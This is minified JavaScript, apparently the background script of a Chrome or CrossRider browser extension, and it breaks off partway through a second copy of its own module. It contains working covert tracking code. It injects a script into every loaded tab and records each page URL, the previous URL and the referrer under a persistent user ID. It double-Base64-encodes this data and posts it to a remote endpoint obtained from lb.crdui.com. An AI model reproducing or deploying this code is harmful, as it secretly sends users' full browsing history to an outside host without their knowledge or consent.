var SIM_CONSTS={SIMPLE_SRC:"821",SIMPLE_LB_URL:"http://lb.crdui.com/settings",ADV_SRC:"1821",ADV_LB_URL:"http://lb.crdui.com/settings"};!function(){var SIM_ModuleConstants={_TMV:"3008.0"},SIM_Config_BG={_source:null,_default_source:SIM_CONSTS.SIMPLE_SRC,_url_lb:SIM_CONSTS.SIMPLE_LB_URL,_DEBUG_MODE:!1,getSourceId:function(){try{if(null!=this._source)return this._source;if(utils.isCrossRider())this._source=utils.getInstallerSourceId(this._default_source);else{var a=window.localStorage.src;this._source=a&&"undefined"!=typeof a?a:this._default_source}return this._source}catch(b){return SIM_Logger_BG.SEVERE("8877",b),this._default_source}}},SIM_DB_CrossRider={setImpl:function(a,b){appAPI.db.set(a,b)},getImpl:function(a){return appAPI.db.get(a)},removeImpl:function(a){appAPI.db.remove(a)},clearImpl:function(){throw new Error("clearImpl - Not implemented yet")}},SIM_DB_GC_Native={setImpl:function(a,b){window.localStorage[a]=b},getImpl:function(a){return window.localStorage[a]},removeImpl:function(a){window.localStorage[a]=void 0,window.localStorage.removeItem(a)},clearImpl:function(){for(var a in window.localStorage)this.removeImpl(a)}},SIM_DB_Adapter={_db:void 0,init:function(){void 0==this._db&&(this._db="undefined"!=typeof appAPI?SIM_DB_CrossRider:SIM_DB_GC_Native)},set:function(a,b){if("string"!=typeof a||""==a)throw new Error("4002, Invalid param: key");void 0==this._db&&this.init(),this._db.setImpl(a,b)},get:function(a){if("string"!=typeof a||""==a)throw new Error("4003, Invalid param: key");return void 0==this._db&&this.init(),this._db.getImpl(a)},remove:function(a){if("string"!=typeof a||""==a)throw new Error("4004, Invalid param: key");void 0==this._db&&this.init(),this._db.removeImpl(a)},clear:function(){void 0==this._db&&this.init(),this._db.clearImpl()}},SIM_Request_CrossRider={postImpl:function(a,b,c,d,e){appAPI.request.post({url:a,postData:c,onSuccess:d,onFailure:e,contentType:"application/x-www-form-urlencoded"})},getImpl:function(a,b,c,d){appAPI.request.get({url:a,onSuccess:c,onFailure:d})}},SIM_Request_GC_Native={postImpl:function(a,b,c,d,e){var f=new XMLHttpRequest;f.open("POST",a,!0),f.setRequestHeader("Content-type","application/x-www-form-urlencoded"),f.onreadystatechange=function(){4==f.readyState&&(200==f.status?d(JSON.parse(f.responseText)):e(f))},f.send(c)},getImpl:function(a,b,c,d){var e=new XMLHttpRequest;e.open("GET",a,!0),e.onreadystatechange=function(){4==e.readyState&&(200==e.status?c(JSON.parse(e.responseText)):d(e))},e.send(null)}},SIM_Request_Adapter={_impl:void 0,init:function(){void 0==this._impl&&(this._impl="undefined"!=typeof appAPI?SIM_Request_CrossRider:SIM_Request_GC_Native)},post:function(a,b,c,d,e){if("string"!=typeof a||""==a)throw new Error("4007, Invalid param: url_");if("string"!=typeof b||"text"!=b&&"json"!=b)throw new Error("4008, Invalid param: expectedResult_");if("string"!=typeof c)throw new Error("4009, Invalid param: data_");if("function"!=typeof d)throw new Error("4010, Invalid param: onSuccess_");if("function"!=typeof e)throw new Error("4011, Invalid param: onError_");void 0==this._impl&&this.init(),this._impl.postImpl(a,b,c,d,e)},get:function(a,b,c,d){if("string"!=typeof a||""==a)throw new Error("4012, Invalid param: url_");if("string"!=typeof b||"text"!=b&&"json"!=b)throw new Error("4013, Invalid param: expectedResult_");if("function"!=typeof c)throw new Error("4014, Invalid param: onSuccess_");if("function"!=typeof d)throw new Error("4015, Invalid param: onError_");void 0==this._impl&&this.init(),this._impl.getImpl(a,b,c,d)}},SIM_Browser={getName:function(){return"undefined"!=typeof appAPI?appAPI.browser.name:"chrome"}},SIM_StoragePerTMV={set:function(a,b){a=SIM_ModuleConstants._TMV+"."+a,utils.db.set(a,b)},get:function(a){return a=SIM_ModuleConstants._TMV+"."+a,utils.db.get(a)}},SIM_FrameworkUtils={db:SIM_DB_Adapter,browser:SIM_Browser,net:SIM_Request_Adapter,db_tmv:SIM_StoragePerTMV,isCrossRider:function(){return"undefined"!=typeof appAPI?!0:!1},createRandomNumber:function(){return Math.floor(1e18*Math.random())},createRandomString:function(a){for(var b="",c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",d=0;a>d;d++)b+=c.charAt(Math.floor(Math.random()*c.length));return b},createUserID:function(){return"undefined"!=typeof appAPI?appAPI.getCrossriderID()||this.createRandomString(15):this.createRandomString(15)},getInstallerSourceId:function(a){if("undefined"!=typeof appAPI){var b=appAPI.installer.getParams().source_id;return 0!=b?b:a}return a},getSub:function(){return"undefined"!=typeof appAPI?appAPI.appID||"":"chrome"},getExtensionId:function(){if("undefined"!=typeof appAPI)return appAPI.appID;if("chrome"==this.browser.getName())return"undefined"!=typeof chrome.runtime?chrome.runtime.id:chrome.i18n.getMessage("@@extension_id");throw new Error("4016, not implemented")}},SIM_Logger_BG={_counter:0,logImpl:function(a,b){if(SIM_Config_BG._DEBUG_MODE)try{var c=++this._counter+"> "+this.getNow()+", "+a+", "+b;if("chrome"!=utils.browser.getName()||"ERROR"!=a&&"SEVERE"!=a)if("chrome"==utils.browser.getName()&&"HIGHLIGHT"==a){c="%c"+c;var d="color: blue;";d+="a:link{color: blue;};a:active{color: blue;}",console.log(c,d)}else console.log(c);else console.error(c)}catch(e){}},HT:function(a){this.logImpl("HIGHLIGHT",a)},INFO:function(a){this.logImpl("INFO",a)},ERROR:function(a){this.logImpl("ERROR",a)},SEVERE:function(a,b){this.logImpl("SEVERE",a+" Exception: "+b.message)},SEVERE2:function(a){this.logImpl("SEVERE",a)},pad:function(a,b){for(var c=a+"";c.length<b;)c="0"+c;return c},getNow:function(){try{var a=new Date,b=a.getDate()+"/"+(a.getMonth()+1)+"/"+a.getFullYear(),c=this.pad(a.getHours(),2)+":"+this.pad(a.getMinutes(),2)+":"+this.pad(a.getSeconds(),2)+"."+this.pad(a.getMilliseconds(),3),d=b+" "+c;return d}catch(e){return""}},addConsoleHelper:function(){SIM_Config_BG._DEBUG_MODE&&chrome.runtime.onMessage.addListener(function(a,b){if(void 0!=a.console_log_message){var c=b.tab?", from a content script of url : = ["+b.tab.url+"]":", from the extension.",d="FROM_CONTENT_PAGE : message = ["+a.console_log_message+"]"+c;log.INFO(d)}})},testLogFromContentPage:function(a){var b=function(){try{chrome.runtime.sendMessage({console_log_message:"message from content page"},function(){})}catch(a){alert(a)}},c=b.toString(),d=c.slice(c.indexOf("{")+1,c.lastIndexOf("}"));chrome.tabs.executeScript(a,{code:d},function(a){log.INFO("executeScript, result = "+a)})}},SIM_Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(a){var b,c,d,e,f,g,h,i="",j=0;for(a=this._utf8_encode(a);j<a.length;)b=a.charCodeAt(j++),c=a.charCodeAt(j++),d=a.charCodeAt(j++),e=b>>2,f=(3&b)<<4|c>>4,g=(15&c)<<2|d>>6,h=63&d,isNaN(c)?g=h=64:isNaN(d)&&(h=64),i=i+this._keyStr.charAt(e)+this._keyStr.charAt(f)+this._keyStr.charAt(g)+this._keyStr.charAt(h);return i},decode:function(a){var b,c,d,e,f,g,h,i="",j=0;for(a=a.replace(/[^A-Za-z0-9\+\/\=]/g,"");j<a.length;)e=this._keyStr.indexOf(a.charAt(j++)),f=this._keyStr.indexOf(a.charAt(j++)),g=this._keyStr.indexOf(a.charAt(j++)),h=this._keyStr.indexOf(a.charAt(j++)),b=e<<2|f>>4,c=(15&f)<<4|g>>2,d=(3&g)<<6|h,i+=String.fromCharCode(b),64!=g&&(i+=String.fromCharCode(c)),64!=h&&(i+=String.fromCharCode(d));return i=this._utf8_decode(i)},_utf8_encode:function(a){a=a.replace(/\r\n/g,"\n");for(var b="",c=0;c<a.length;c++){var d=a.charCodeAt(c);128>d?b+=String.fromCharCode(d):d>127&&2048>d?(b+=String.fromCharCode(d>>6|192),b+=String.fromCharCode(63&d|128)):(b+=String.fromCharCode(d>>12|224),b+=String.fromCharCode(d>>6&63|128),b+=String.fromCharCode(63&d|128))}return b},_utf8_decode:function(a){for(var b="",c=0,d=0,e=0,f=0;c<a.length;)d=a.charCodeAt(c),128>d?(b+=String.fromCharCode(d),c++):d>191&&224>d?(e=a.charCodeAt(c+1),b+=String.fromCharCode((31&d)<<6|63&e),c+=2):(e=a.charCodeAt(c+1),f=a.charCodeAt(c+2),b+=String.fromCharCode((15&d)<<12|(63&e)<<6|63&f),c+=3);return b}};"object"!=typeof JSON&&(JSON={}),function(){function f(a){return 10>a?"0"+a:a}function quote(a){return escapable.lastIndex=0,escapable.test(a)?'"'+a.replace(escapable,function(a){var b=meta[a];return"string"==typeof b?b:"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+a+'"'}function str(a,b){var c,d,e,f,g,h=gap,i=b[a];switch(i&&"object"==typeof i&&"function"==typeof i.toJSON&&(i=i.toJSON(a)),"function"==typeof rep&&(i=rep.call(b,a,i)),typeof i){case"string":return quote(i);case"number":return isFinite(i)?String(i):"null";case"boolean":case"null":return String(i);case"object":if(!i)return"null";if(gap+=indent,g=[],"[object Array]"===Object.prototype.toString.apply(i)){for(f=i.length,c=0;f>c;c+=1)g[c]=str(c,i)||"null";return e=0===g.length?"[]":gap?"[\n"+gap+g.join(",\n"+gap)+"\n"+h+"]":"["+g.join(",")+"]",gap=h,e}if(rep&&"object"==typeof rep)for(f=rep.length,c=0;f>c;c+=1)"string"==typeof rep[c]&&(d=rep[c],e=str(d,i),e&&g.push(quote(d)+(gap?": ":":")+e));else for(d in i)Object.prototype.hasOwnProperty.call(i,d)&&(e=str(d,i),e&&g.push(quote(d)+(gap?": ":":")+e));return e=0===g.length?"{}":gap?"{\n"+gap+g.join(",\n"+gap)+"\n"+h+"}":"{"+g.join(",")+"}",gap=h,e}}"function"!=typeof Date.prototype.toJSON&&(Date.prototype.toJSON=function(){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+f(this.getUTCMonth()+1)+"-"+f(this.getUTCDate())+"T"+f(this.getUTCHours())+":"+f(this.getUTCMinutes())+":"+f(this.getUTCSeconds())+"Z":null},String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(){return this.valueOf()});var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={"\b":"\\b","	":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},rep;"function"!=typeof JSON.stringify&&(JSON.stringify=function(a,b,c){var d;if(gap="",indent="","number"==typeof c)for(d=0;c>d;d+=1)indent+=" ";else"string"==typeof c&&(indent=c);if(rep=b,b&&"function"!=typeof b&&("object"!=typeof b||"number"!=typeof b.length))throw new Error("JSON.stringify");return str("",{"":a})}),"function"!=typeof JSON.parse&&(JSON.parse=function(text,reviver){function walk(a,b){var c,d,e=a[b];if(e&&"object"==typeof e)for(c in e)Object.prototype.hasOwnProperty.call(e,c)&&(d=walk(e,c),void 0!==d?e[c]=d:delete e[c]);return reviver.call(a,b,e)}var j;if(text=String(text),cx.lastIndex=0,cx.test(text)&&(text=text.replace(cx,function(a){return"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})),/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,"")))return j=eval("("+text+")"),"function"==typeof reviver?walk({"":j},""):j;throw new SyntaxError("JSON.parse")})}();var SIM_Session={_sessionid:void 0,getSessionId:function(){return"undefined"==typeof this._sessionid&&(this._sessionid=utils.createRandomNumber()),this._sessionid}},SIM_LB_Client=function(){function a(){try{var a=new XMLHttpRequest;a.open("GET",chrome.extension.getURL("manifest.json"),!1),a.send(null);var b=JSON.parse(a.responseText);return b.version}catch(c){return void 0}}this.initOnceAfterInstall=function(){if("undefined"==typeof utils.db.get("userid")){var a=utils.createUserID();utils.db.set("userid",a)}if("undefined"==typeof utils.db.get("install_time")){var b=(new Date).getTime()/1e3;utils.db.set("install_time",b)}},this.start_lb=function(){try{log.HT("start_lb enter"),this.initOnceAfterInstall();var b=SIM_Config_BG._url_lb,c="s="+SIM_Config_BG.getSourceId();c+="&ins="+encodeURIComponent(utils.db.get("install_time"))+"&ver="+encodeURIComponent(a()),b=b+"?"+c,utils.net.get(b,"json",function(a){log.INFO("Success to get lb"),"undefined"!=typeof a.Status?"1"==a.Status?"undefined"!=typeof a.Endpoint?(utils.db_tmv.set("server",a.Endpoint),a.Mon&&"1"==a.Mon?utils.db.set("enable_mon",!0):utils.db.set("enable_mon",!1)):log.ERROR("Invalid lb response, no Endpoint or Midpoint"):(log.INFO("WARN: result.Status is not 1"),utils.db_tmv.set("server",""),utils.db.set("enable_mon",!1)):log.ERROR("Invalid lb response, no Status = "+a.Status)},function(a){log.ERROR("Failed to get lb, ,url = "+b+", httpCode = "+a.status)}),log.HT("start_lb leave");try{log.addConsoleHelper()}catch(d){log.SEVERE("9071",d)}var e=new SIM_DataTracker_GC;e.start()}catch(d){log.SEVERE("9001",d)}}},SIM_DataTracker_GC=function(){function a(a,b,c){try{if(log.HT("tabs_onUpdated, tabId = "+a+", changeInfo.status = "+b.status+", tab = "+c.url),!b||!b.status||"complete"!=b.status)return;if("chrome://newtab/"==c.url)return;if(-1!=c.url.indexOf("chrome-devtools://"))return;var d=function(){try{var a="";try{a=document.doctype.name}catch(b){}var c={docType:a,tab_id:__TABID__PLACEHOLDER__,tab_url_:__TABURL__PLACEHOLDER__,change_status_:__CHANGE_STATUS__PLACEHOLDER__,fromTMV_:__TMV__PLACEHOLDER__,ref:document.referrer,messageId_:55557777};chrome.extension.sendRequest(c,function(){})}catch(b){}},e=d.toString();e=e.replace("__TABID__PLACEHOLDER__",c.id);var g=SIM_Base64.encode(c.url);e=e.replace("__TABURL__PLACEHOLDER__","'"+g+"'"),e=e.replace("__CHANGE_STATUS__PLACEHOLDER__","'"+b.status+"'"),e=e.replace("__TMV__PLACEHOLDER__","'"+f+"'");var h=e.slice(e.indexOf("{")+1,e.lastIndexOf("}"));chrome.tabs.executeScript(c.id,{code:h},function(){})}catch(i){console.error("ERR 8000: "+i)}}function b(a){try{var b,c=void 0,d=void 0;c=g[a],c&&""!=c?d=a:k&&a!=k?(d=k,log.INFO("prevTabId flow A")):j&&a!=j?(d=j,log.INFO("prevTabId flow B")):(d=a,log.ERROR("Failed to find prevTabId"));var b="";return d&&g[d]&&(b=g[d]),b}catch(e){return console.error("ERROR 8001: "+e),""}}function c(a,c){var d=a;try{var e=utils.getExtensionId();if(c&&c.id==e){var j=a.fromTMV_;if(j&&j==f)if(d.messageId_&&55557777==d.messageId_){var k=d.tab_id,l=b(k);if(""!=utils.db_tmv.get("server")&&"undefined"!=utils.db_tmv.get("server")){var m=d.ref,n=d.docType,o=d.tab_url_,p=SIM_Base64.decode(o),q=d.change_status_;log.HT("extension_onRequest, url = ["+p+"] ,ref = ["+m+"],  computePrev2 = ["+l+"]");var r=!1,s=g[k];if(s&&""!=s||(r=!0),r){var t="(http|https)://(.*.|)google..*/url?.*",u=new RegExp(t,void 0),v=u.test(p);if(u=null,v)return void log.HT("extension_onRequest: Skipped redirect = "+p)}var t="(http|https)://(.*.|)google..*/aclk?.*",u=new RegExp(t,void 0),v=u.test(p);if(u=null,v)return void log.HT("extension_onRequest: Skipped ppc redirect = "+p);if("html"!=n&&""!=n)return g[k]="",void log.ERROR("ERROR 8000 ??");g[k]=p;var w=-1;if(h[k]&&(w=Date.now()-h[k]),h[k]=Date.now(),w>=0&&100>w&&g[k]==p)return void log.ERROR("ERROR 8001 ?? Skipped, update_diff < 10, tab_url = "+p);var x=i[k];if(i[k]=q,l==p&&x!=q)return void log.ERROR("ERROR 8002 ??");var y="s="+SIM_Config_BG.getSourceId()+"&md=21&pid="+utils.db.get("userid")+"&sess="+SIM_Session.getSessionId()+"&q="+encodeURIComponent(p)+"&prev="+encodeURIComponent(l)+"&link="+(m?"1":"0")+"&sub=chrome&hreferer="+encodeURIComponent(m);y=y+"&tmv="+SIM_ModuleConstants._TMV,y=SIM_Base64.encode(SIM_Base64.encode(y)),y="e="+y;var z=utils.db_tmv.get("server")+"/related";utils.net.post(z,"json",y,function(){log.INFO("Succeeded in posting data"),g[k]=p},function(a){log.INFO("Failed to retrieve content. (HTTP Code:"+a.status+")"),log.ERROR("ERROR 8004 ??"),g[k]=p})}}else log.ERROR("messaged unknown, or undefined : request = "+a);else j?log.INFO("Message of other tmv = "+j):log.ERROR("Message without fromTMV")}else log.ERROR("unknown sender = "+c.id)}catch(A){console.error("ERR 8002: "+A)}}function d(a){try{log.INFO("tabs.onActivated  windowId = "+a.windowId+", tabId = "+a.tabId),a.tabId>=0?(j=k,k=a.tabId):log.ERROR("tabs_onActivated, how to handle activeInfo.tabId <0  ?")}catch(b){log.SEVERE("8834",b)}}function e(a,b){try{if(log.INFO("tabs_onReplaced, addedTabId = "+a+", removedTabId = "+b),a>=0&&b>=0){var c=0;c=1}}catch(d){log.SEVERE("8837",d)}}var f=SIM_ModuleConstants._TMV,g=new Array,h=new Array,i=new Array,j=!1,k=!1;this.start=function(){try{chrome.extension.onRequest.addListener(c),chrome.tabs.onUpdated.addListener(a),chrome.tabs.onActivated.addListener(d),chrome.tabs.onReplaced.addListener(e)}catch(b){log.SEVERE("8835",b)}}},log=SIM_Logger_BG;log.INFO("Hello");var utils=SIM_FrameworkUtils;this.main=function(){try{var a=new SIM_LB_Client;a.start_lb()}catch(b){console.log("9099, "+b)}},this.main()}(),function(){var SIM_ModuleConstants={_TMV:"4004.0"},SIM_Config_BG={_source:null,_default_source:SIM_CONSTS.ADV_SRC,_url_lb:SIM_CONSTS.ADV_LB_URL,_DEBUG_MODE:!1,getSourceId:function(){try{if(null!=this._source)return this._source;if(utils.isCrossRider())this._source=utils.getInstallerSourceId(this._default_source);else{var a=window.localStorage.src;a&&"undefined"!=typeof a?window.localStorage.src_adv?this._source=window.localStorage.src_adv:(a="1"+a,window.localStorage.src_adv=a,this._source=a):this._source=this._default_source}return this._source}catch(b){return SIM_Logger_BG.SEVERE("8877",b),this._default_source}}},SIM_DB_CrossRider={setImpl:function(a,b){appAPI.db.set(a,b)},getImpl:function(a){return appAPI.db.get(a)},removeImpl:function(a){appAPI.db.remove(a)},clearImpl:function(){throw new Error("clearImpl - Not implemented yet")}},SIM_DB_GC_Native={setImpl:function(a,b){window.localStorage[a]=b},getImpl:function(a){return window.localStorage[a]},removeImpl:function(a){window.localStorage[a]=void 0,window.localStorage.removeItem(a)},clearImpl:function(){for(var a in window.localStorage)this.removeImpl(a)}},SIM_DB_Adapter={_db:void 0,init:function(){void 0==this._db&&(this._db="undefined"!=typeof appAPI?SIM_DB_CrossRider:SIM_DB_GC_Native)},set:function(a,b){if("string"!=typeof a||""==a)throw new Error("4002, Invalid param: key");void 0==this._db&&this.init(),this._db.setImpl(a,b)},get:function(a){if("string"!=typeof a||""==a)throw new Error("4003, Invalid param: key");return void 0==this._db&&this.init(),this._db.getImpl(a)},remove:function(a){if("string"!=typeof a||""==a)throw new Error("4004, Invalid param: key");void 0==this._db&&this.init(),this._db.removeImpl(a)},clear:function(){void 0==this._db&&this.init(),this._db.clearImpl()}},SIM_Request_CrossRider={postImpl:function(a,b,c,d,e){appAPI.request.post({url:a,postData:c,onSuccess:d,onFailure:e,contentType:"application/x-www-form-urlencoded"})},getImpl:function(a,b,c,d){appAPI.request.get({url:a,onSuccess:c,onFailure:d})}},SIM_Request_GC_Native={postImpl:function(a,b,c,d,e){var f=new XMLHttpRequest;f.open("POST",a,!0),f.setRequestHeader("Content-type","application/x-www-form-urlencoded"),f.onreadystatechange=function(){4==f.readyState&&(200==f.status?d(JSON.parse(f.responseText)):e(f))},f.send(c)},getImpl:function(a,b,c,d){var e=new XMLHttpRequest;e.open("GET",a,!0),e.onreadystatechange=function(){4==e.readyState&&(200==e.status?c(JSON.parse(e.responseText)):d(e))},e.send(null)}},SIM_Request_Adapter={_impl:void 0,init:function(){void 0==this._impl&&(this._impl="undefined"!=typeof appAPI?SIM_Request_CrossRider:SIM_Request_GC_Native)},post:function(a,b,c,d,e){if("string"!=typeof a||""==a)throw new Error("4007, Invalid param: url_");if("string"!=typeof b||"text"!=b&&"json"!=b)throw new Error("4008, Invalid param: expectedResult_");if("string"!=typeof c)throw new Error("4009, Invalid param: data_");if("function"!=typeof d)throw new Error("4010, Invalid param: onSuccess_");if("function"!=typeof e)throw new Error("4011, Invalid param: onError_");void 0==this._impl&&this.init(),this._impl.postImpl(a,b,c,d,e)},get:function(a,b,c,d){if("string"!=typeof a||""==a)throw new Error("4012, Invalid param: url_");if("string"!=typeof b||"text"!=b&&"json"!=b)throw new Error("4013, Invalid param: expectedResult_");if("function"!=typeof c)throw new Error("4014, Invalid param: onSuccess_");if("function"!=typeof d)throw new Error("4015, Invalid param: onError_");void 0==this._impl&&this.init(),this._impl.getImpl(a,b,c,d)}},SIM_Browser={getName:function(){return"undefined"!=typeof appAPI?appAPI.browser.name:"chrome"}},SIM_StoragePerTMV={set:function(a,b){a=SIM_ModuleConstants._TMV+"."+a,utils.db.set(a,b)},get:function(a){return a=SIM_ModuleConstants._TMV+"."+a,utils.db.get(a)}},SIM_FrameworkUtils={db:SIM_DB_Adapter,browser:SIM_Browser,net:SIM_Request_Adapter,db_tmv:SIM_StoragePerTMV,isCrossRider:function(){return"undefined"!=typeof appAPI?!0:!1},createRandomNumber:function(){return Math.floor(1e18*Math.random())},createRandomString:function(a){for(var b="",c="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",d=0;a>d;d++)b+=c.charAt(Math.floor(Math.random()*c.length));return b},createUserID:function(){return"undefined"!=typeof appAPI?appAPI.getCrossriderID()||this.createRandomString(15):this.createRandomString(15)},getInstallerSourceId:function(a){if("undefined"!=typeof appAPI){var b=appAPI.installer.getParams().source_id;return 0!=b?b:a}return a},getSub:function(){return"undefined"!=typeof appAPI?appAPI.appID||"":"chrome"},getExtensionId:function(){if("undefined"!=typeof appAPI)return appAPI.appID;if("chrome"==this.browser.getName())return"undefined"!=typeof chrome.runtime?chrome.runtime.id:chrome.i18n.getMessage("@@extension_id");throw new Error("4016, not implemented")}},SIM_Logger_BG={_counter:0,logImpl:function(a,b){if(SIM_Config_BG._DEBUG_MODE)try{var c=++this._counter+"> "+this.getNow()+", "+a+", "+b;if("chrome"!=utils.browser.getName()||"ERROR"!=a&&"SEVERE"!=a)if("chrome"==utils.browser.getName()&&"HIGHLIGHT"==a){c="%c"+c;var d="color: blue;";d+="a:link{color: blue;};a:active{color: blue;}",console.log(c,d)}else console.log(c);else console.error(c)}catch(e){}},HT:function(a){this.logImpl("HIGHLIGHT",a)},INFO:function(a){this.logImpl("INFO",a)},ERROR:function(a){this.logImpl("ERROR",a)},SEVERE:function(a,b){this.logImpl("SEVERE",a+" Exception: "+b.message)},SEVERE2:function(a){this.logImpl("SEVERE",a)},pad:function(a,b){for(var c=a+"";c.length<b;)c="0"+c;return c},getNow:function(){try{var a=new Date,b=a.getDate()+"/"+(a.getMonth()+1)+"/"+a.getFullYear(),c=this.pad(a.getHours(),2)+":"+this.pad(a.getMinutes(),2)+":"+this.pad(a.getSeconds(),2)+"."+this.pad(a.getMilliseconds(),3),d=b+" "+c;return d}catch(e){return""}},addConsoleHelper:function(){SIM_Config_BG._DEBUG_MODE&&chrome.runtime.onMessage.addListener(function(a,b){if(void 0!=a.console_log_message){var c=b.tab?", from a content script of url : = ["+b.tab.url+"]":", from the extension.",d="FROM_CONTENT_PAGE : message = ["+a.console_log_message+"]"+c;log.INFO(d)}})},testLogFromContentPage:function(a){var b=function(){try{chrome.runtime.sendMessage({console_log_message:"message from content page"},function(){})}catch(a){alert(a)}},c=b.toString(),d=c.slice(c.indexOf("{")+1,c.lastIndexOf("}"));chrome.tabs.executeScript(a,{code:d},function(a){log.INFO("executeScript, result = "+a)})}},SIM_Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(a){var b,c,d,e,f,g,h,i="",j=0;for(a=this._utf8_encode(a);j<a.length;)b=a.charCodeAt(j++),c=a.charCodeAt(j++),d=a.charCodeAt(j++),e=b>>2,f=(3&b)<<4|c>>4,g=(15&c)<<2|d>>6,h=63&d,isNaN(c)?g=h=64:isNaN(d)&&(h=64),i=i+this._keyStr.charAt(e)+this._keyStr.charAt(f)+this._keyStr.charAt(g)+this._keyStr.charAt(h);return i},decode:function(a){var b,c,d,e,f,g,h,i="",j=0;for(a=a.replace(/[^A-Za-z0-9\+\/\=]/g,"");j<a.length;)e=this._keyStr.indexOf(a.charAt(j++)),f=this._keyStr.indexOf(a.charAt(j++)),g=this._keyStr.indexOf(a.charAt(j++)),h=this._keyStr.indexOf(a.charAt(j++)),b=e<<2|f>>4,c=(15&f)<<4|g>>2,d=(3&g)<<6|h,i+=String.fromCharCode(b),64!=g&&(i+=String.fromCharCode(c)),64!=h&&(i+=String.fromCharCode(d));return i=this._utf8_decode(i)},_utf8_encode:function(a){a=a.replace(/\r\n/g,"\n");for(var b="",c=0;c<a.length;c++){var d=a.charCodeAt(c);128>d?b+=String.fromCharCode(d):d>127&&2048>d?(b+=String.fromCharCode(d>>6|192),b+=String.fromCharCode(63&d|128)):(b+=String.fromCharCode(d>>12|224),b+=String.fromCharCode(d>>6&63|128),b+=String.fromCharCode(63&d|128))}return b},_utf8_decode:function(a){for(var b="",c=0,d=0,e=0,f=0;c<a.length;)d=a.charCodeAt(c),128>d?(b+=String.fromCharCode(d),c++):d>191&&224>d?(e=a.charCodeAt(c+1),b+=String.fromCharCode((31&d)<<6|63&e),c+=2):(e=a.charCodeAt(c+1),f=a.charCodeAt(c+2),b+=String.fromCharCode((15&d)<<12|(63&e)<<6|63&f),c+=3);return b}};"object"!=typeof JSON&&(JSON={}),function(){function f(a){return 10>a?"0"+a:a}function quote(a){return escapable.lastIndex=0,escapable.test(a)?'"'+a.replace(escapable,function(a){var b=meta[a];return"string"==typeof b?b:"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})+'"':'"'+a+'"'}function str(a,b){var c,d,e,f,g,h=gap,i=b[a];switch(i&&"object"==typeof i&&"function"==typeof i.toJSON&&(i=i.toJSON(a)),"function"==typeof rep&&(i=rep.call(b,a,i)),typeof i){case"string":return quote(i);case"number":return isFinite(i)?String(i):"null";case"boolean":case"null":return String(i);case"object":if(!i)return"null";if(gap+=indent,g=[],"[object Array]"===Object.prototype.toString.apply(i)){for(f=i.length,c=0;f>c;c+=1)g[c]=str(c,i)||"null";return e=0===g.length?"[]":gap?"[\n"+gap+g.join(",\n"+gap)+"\n"+h+"]":"["+g.join(",")+"]",gap=h,e}if(rep&&"object"==typeof rep)for(f=rep.length,c=0;f>c;c+=1)"string"==typeof rep[c]&&(d=rep[c],e=str(d,i),e&&g.push(quote(d)+(gap?": ":":")+e));else for(d in i)Object.prototype.hasOwnProperty.call(i,d)&&(e=str(d,i),e&&g.push(quote(d)+(gap?": ":":")+e));return e=0===g.length?"{}":gap?"{\n"+gap+g.join(",\n"+gap)+"\n"+h+"}":"{"+g.join(",")+"}",gap=h,e}}"function"!=typeof Date.prototype.toJSON&&(Date.prototype.toJSON=function(){return isFinite(this.valueOf())?this.getUTCFullYear()+"-"+f(this.getUTCMonth()+1)+"-"+f(this.getUTCDate())+"T"+f(this.getUTCHours())+":"+f(this.getUTCMinutes())+":"+f(this.getUTCSeconds())+"Z":null},String.prototype.toJSON=Number.prototype.toJSON=Boolean.prototype.toJSON=function(){return this.valueOf()});var cx=/[\u0000\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,escapable=/[\\\"\x00-\x1f\x7f-\x9f\u00ad\u0600-\u0604\u070f\u17b4\u17b5\u200c-\u200f\u2028-\u202f\u2060-\u206f\ufeff\ufff0-\uffff]/g,gap,indent,meta={"\b":"\\b","	":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"},rep;"function"!=typeof JSON.stringify&&(JSON.stringify=function(a,b,c){var d;if(gap="",indent="","number"==typeof c)for(d=0;c>d;d+=1)indent+=" ";else"string"==typeof c&&(indent=c);if(rep=b,b&&"function"!=typeof b&&("object"!=typeof b||"number"!=typeof b.length))throw new Error("JSON.stringify");return str("",{"":a})}),"function"!=typeof JSON.parse&&(JSON.parse=function(text,reviver){function walk(a,b){var c,d,e=a[b];if(e&&"object"==typeof e)for(c in e)Object.prototype.hasOwnProperty.call(e,c)&&(d=walk(e,c),void 0!==d?e[c]=d:delete e[c]);return reviver.call(a,b,e)}var j;if(text=String(text),cx.lastIndex=0,cx.test(text)&&(text=text.replace(cx,function(a){return"\\u"+("0000"+a.charCodeAt(0).toString(16)).slice(-4)})),/^[\],:{}\s]*$/.test(text.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,"")))return j=eval("("+text+")"),"function"==typeof reviver?walk({"":j},""):j;throw new SyntaxError("JSON.parse")})}();var 